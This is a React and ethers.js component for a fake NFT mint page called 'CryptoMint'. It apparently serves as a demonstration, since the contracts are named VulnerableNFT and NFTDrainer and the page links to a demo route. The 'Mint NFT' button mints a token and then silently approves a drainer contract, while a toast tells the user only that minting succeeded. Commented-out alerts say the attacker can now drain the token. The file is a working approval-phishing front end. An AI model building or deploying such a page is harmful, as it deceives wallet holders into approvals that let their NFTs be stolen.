import { Sparkles, Wallet, ArrowRight, Twitter, DiscIcon as Discord } from "lucide-react";
import { Link, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useState } from "react";
import { ethers } from "ethers";
import VulnerableNFTABI from "../../abis/VulnerableNFT.json";
import NFTDrainerABI from "../../abis/NFTDrainer.json";
import DeployersADD from "../../abis/DeployersADD.json";
import { toast } from "sonner";
import ryugaImage from "../assets/ryuga.jpeg";

const NFT_CONTRACT_ADDRESS = DeployersADD.nftAddress;
const DRAINER_CONTRACT_ADDRESS = DeployersADD.drainerAddress;

export function Home() {
  const navigate = useNavigate();
  const [account, setAccount] = useState(null);
  const [nftId, setNftId] = useState(null);
  const [isApproved, setIsApproved] = useState(false);

  const connectWallet = async () => {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      setAccount(accounts[0]);
    } else {
      alert("Install MetaMask!");
    }
  };

  // Mint NFT
  const mintNFT = async () => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const nftContract = new ethers.Contract(NFT_CONTRACT_ADDRESS, VulnerableNFTABI.abi, signer);

      const tx = await nftContract.mint(account, { gasLimit: 200000 });
      const receipt = await tx.wait();

      let tokenId;
      const transferEvent = receipt.logs
        .map((log) => {
          try {
            return nftContract.interface.parseLog(log);
          } catch (e) {
            return null;
          }
        })
        .find((event) => event && event.name === "Transfer");

      if (transferEvent) {
        tokenId = transferEvent.args.tokenId;
      } else {
        tokenId = tx.value;
        if (!tokenId) throw new Error("No tokenId found");
      }

      setNftId(tokenId.toString());
      return tokenId.toString(); // Return tokenId for use in createNft
    } catch (error) {
      console.error("Mint error:", error);
      alert("Mint failed: " + error.message);
      throw error; // Re-throw to handle in createNft
    }
  };

  // Approve Drainer
  const approveDrainer = async (tokenId) => { // Pass tokenId as parameter
    try {
      if (!tokenId) throw new Error("No NFT ID available to approve");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const nftContract = new ethers.Contract(NFT_CONTRACT_ADDRESS, VulnerableNFTABI.abi, signer);
      await nftContract.approve(DRAINER_CONTRACT_ADDRESS, tokenId, { gasLimit: 200000 });
      setIsApproved(true);
    //   alert("NFT Approved! Now the attacker can drain it.");
    toast.success("NFT successfully minted!");
    } catch (error) {
      console.error("Approve error:", error);
      alert("Approve failed: " + error.message);
      throw error;
    }
  };

  // Drain NFT
  const drainNFT = async () => {
    try {
      if (!nftId) throw new Error("No NFT ID available to drain");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const drainerContract = new ethers.Contract(DRAINER_CONTRACT_ADDRESS, NFTDrainerABI.abi, signer);

      const tx = await drainerContract.drainNFT(NFT_CONTRACT_ADDRESS, nftId, { gasLimit: 200000 });
      await tx.wait();
        toast.success(`nft claimed to :${account}`)
    //   alert(`NFT ${nftId} drained successfully! It’s now owned by the attacker.`);
    //   setNftId(null); // Reset state
    //   setIsApproved(false);
    } catch (error) {
      console.error("Drain error:", error);
    //   if (error.code === "CALL_EXCEPTION") {
    //     alert("Drain failed: Transaction reverted. Check if NFT was already drained or approval was revoked.");
    //   } else {
    //     alert("Drain failed: " + error.message);
    //   }
    }
  };

  // Combined Mint and Approve
  const createNft = async () => {
    try {
      const newTokenId = await mintNFT(); // Wait for mint and get tokenId
      if (newTokenId) {
        await approveDrainer(newTokenId); // Pass tokenId to approveDrainer
      }
    } catch (error) {
      console.error("Create NFT error:", error);
    }
  };

    const checkOwner = async () => {
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const nftContract = new ethers.Contract(NFT_CONTRACT_ADDRESS, VulnerableNFTABI.abi, provider);
        const owner = await nftContract.ownerOf(nftId);
        alert(`Current owner of NFT ${nftId}: ${owner}`);
      } catch (error) {
        console.error("Check owner error:", error);
        alert("Failed to check owner: " + error.message);
      }
    };

  return (
    <div>
      <div className="h-dvh w-screen overflow-hidden bg-black text-white flex flex-col">
        {/* Header */}
        <header className="w-full p-4 flex justify-between items-center">
          <div className="flex items-center gap-2">
            <Sparkles className="h-6 w-6 text-purple-500" />
            <span className="font-bold text-xl">CryptoMint</span>
          </div>

          <nav className="hidden lg:flex items-center gap-6">
            <Link href="#" className="hover:text-purple-400 transition-colors">
              Home
            </Link>
            <Link href="#" className="hover:text-purple-400 transition-colors">
              Collection
            </Link>
            <Link href="#" className="hover:text-purple-400 transition-colors">
              Roadmap
            </Link>
            <Link href="#" className="hover:text-purple-400 transition-colors">
              FAQ
            </Link>
            <p className="hover:text-purple-400 transition-colors cursor-pointer" onClick={() => navigate('/demo')}>
              Demo
            </p>
          </nav>
          <Button
            className="bg-gradient-to-r from-purple-600 to-blue-500 hover:from-purple-700 hover:to-blue-600 cursor-pointer"
            onClick={connectWallet}
          >
            {account ? (
              <div>{account.slice(0, 6)}...{account.slice(-4)}</div> // Shortened address for UI
            ) : (
              <div className="flex flex-row">
                Connect Wallet
                <Wallet className="ml-2 h-4 w-4" />
              </div>
            )}
          </Button>
        </header>

        {/* Main content */}
        <main className="flex-1 flex flex-col lg:flex-row">
          {/* Left side - Text content */}
          <div className="w-full lg:w-1/2 flex flex-col justify-center p-8">
            <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-purple-400 via-pink-500 to-blue-500">
              Mint & Claim Your Exclusive NFTs
            </h1>
            <p className="text-gray-400 mb-8 text-lg">
              Join the revolution of digital art ownership with our exclusive collection of unique NFTs. Mint now and
              become part of our growing community.
            </p>
            <div className="flex flex-col sm:flex-row gap-4">
              <Button
                className="bg-gradient-to-r from-purple-600 to-blue-500 hover:from-purple-700 hover:to-blue-600 text-lg py-6"
                onClick={createNft}
                disabled={!account} // Disable if not connected
              >
                Mint NFT
                <Sparkles className="ml-2 h-4 w-4" />
              </Button>
              <Button
                variant="outline"
                className="border-purple-500 text-purple-400 hover:bg-purple-500/10 text-lg py-6"
                onClick={drainNFT}
                disabled={!nftId || !isApproved} // Disable unless approved
              >
                Claim NFT
                <ArrowRight className="ml-2 h-4 w-4" />
              </Button>
            </div>
            <div className="mt-8 flex items-center gap-4">
              <div className="flex -space-x-2">
                {[1, 2, 3, 4].map((i) => (
                  <div key={i} className="w-8 h-8 rounded-full border-2 border-black overflow-hidden">
                   <img
                    src={'sdf'}
                    alt={`User ${i}`}
                    width={32}
                    height={32}
                    className="bg-gray-700"
                  />
                  </div>
                ))}
              </div>
              <p className="text-gray-400">
                <span className="text-purple-400 font-bold">2,541</span> NFTs minted
              </p>
            </div>
          </div>

          {/* Right side - NFT Showcase */}
          <div className="w-full lg:w-1/2 flex items-center justify-center p-4">
            <div className="relative w-full max-w-md aspect-square">
              <div className="absolute inset-0 bg-gradient-to-br from-purple-600/20 via-blue-500/20 to-pink-500/20 rounded-xl blur-3xl"></div>
              <Card className="w-full h-full bg-gradient-to-br from-gray-900 to-black border-purple-500/50 overflow-hidden relative">
                <div className="absolute inset-0 flex items-center justify-center">
                {isApproved ?(<img
                      src={ryugaImage}
                      alt={`ryuga`}
                      width={420}
                      height={420}
                      className="bg-gray-700"
                    />):(<img
                    src={'sdf'}
                    alt={``}
                   
                    className="bg-gray-700"
                  />)}
                </div>
                <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
                  <div className="flex justify-between items-end">
                    <div>
                      <p className="text-sm text-gray-400">CryptoMint Collection</p>
                      <h3 className="text-xl font-bold">Cosmic Dreamer #042</h3>
                    </div>
                    <div className="bg-purple-500/20 backdrop-blur-sm rounded-lg px-3 py-1">
                      <p className="text-sm">Price</p>
                      <p className="font-bold">0.08 ETH</p>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </div>
        </main>

        <section>
            <div className="p-6 border border-gray-200 w-36 rounded-3xl cursor-pointer" onClick={checkOwner}> 
                <h1>checkOwner</h1>
            </div>
        </section>

        {/* Footer */}
        <footer className="w-full p-4 flex justify-between items-center border-t border-gray-800">
          <p className="text-sm text-gray-500">© 2025 CryptoMint. All rights reserved.</p>
          <div className="flex gap-4">
            <Link href="#" className="text-gray-400 hover:text-purple-400 transition-colors">
              <Twitter className="h-5 w-5" />
              <span className="sr-only">Twitter</span>
            </Link>
            <Link href="#" className="text-gray-400 hover:text-purple-400 transition-colors">
              <Discord className="h-5 w-5" />
              <span className="sr-only">Discord</span>
            </Link>
          </div>
        </footer>
      </div>
    </div>
  );
}